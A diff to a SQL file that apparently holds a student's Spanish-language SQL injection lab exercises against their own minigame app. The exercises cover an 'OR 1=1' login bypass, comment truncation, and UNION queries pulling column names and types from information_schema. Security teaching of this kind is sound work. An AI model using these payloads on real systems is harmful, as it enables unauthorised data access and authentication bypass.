@@ -69,3 +69,29 @@ SELECT * FROM usuario
 WHERE correo = 'a@b.com' OR '1'='1'
 AND pw = 'a@b.com' OR '1'='1'
 
+/******** 4. Pruebas de SQL INYECTION: Obtención de datos: Usando el formulario elegido de tu parte del minijuego. ********/
+-- EN NUESTRO CASO, SACAREMOS TODA LA INFORMACIÓN RELACIONADA CON TEMAS, YA QUE ES UNO DE LOS PROCESOS QUE REALICÉ DURANTE LA ABP
+-- LAS ENTRADAS DE LOS INPUTS LAS PONDREMOS EN EL DOCUMENTO, YA QUE AL ABRIR Y NO CERRAR COMILLAS (SE CIERRAN EN LA PROPIA CONSULTA DEL MÉTODO DEL MODELO) NO ME DEJA COMENTAR EN EL ARCHIVO SQL.
+
+-- 4.1 Sacar todos los temas de la tabla sin que exista el tema.
+			
+SELECT * FROM tema WHERE nombre = '' OR '1'='1'
+
+-- 4.2 Prueba con comentario SQL.
+
+SELECT * FROM tema WHERE nombre ='' OR '1'='1' --'
+
+--4.3. Obtener el nombre de las columnas de la tabla tema con information_schema
+SELECT * FROM tema WHERE nombre ='' 
+UNION 
+SELECT column_name, 0, 0, 0, 0, 0 FROM information_schema.columns 
+WHERE table_name = 'tema' -- '
+
+--4.4. Obtener el nombre y tipo de dato de las columnas de la tabla tema con information_schema
+SELECT * FROM tema WHERE nombre ='' 
+UNION 
+SELECT column_name, data_type, 0, 0, 0, 0 FROM information_schema.columns 
+WHERE table_name = 'tema' -- '
+
+
+
